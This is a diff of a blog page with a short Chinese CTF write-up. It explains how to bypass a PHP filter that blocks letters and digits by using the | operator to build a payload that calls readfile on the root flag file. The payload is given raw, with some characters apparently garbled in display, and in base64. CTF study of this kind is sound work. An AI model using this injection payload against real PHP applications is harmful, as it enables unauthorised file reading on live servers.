@@ -211,6 +211,8 @@ var _hmt = _hmt || [];
 <p>题目过滤了全部字母和数字和部分位运算符</p>
 <p>由http头X-Powered-By: PHP/7.3.21可知 服务器PHP版本为7.3.21</p>
 <p>需要构造无字母数字的playload</p>
+<span id="more"></span>
+
 <p>虽然过滤了部分位运算符 但还是漏了一个| 或运算</p>
 <p>利用或运算符构造playload 调用readfile函数 读取根目录flag<br>playload</p>
 <figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">code=('````````'|'	')('/````'|'/'));//<br>bas64<br>Y29kZT0oJ2BgYGBgYGBgJ3wnEgUBBAYJDAUnKSgnL2BgYGAnfCcvBgwBBycpKTsvLw==<br></code></pre></td></tr></tbody></table></figure></body></html>
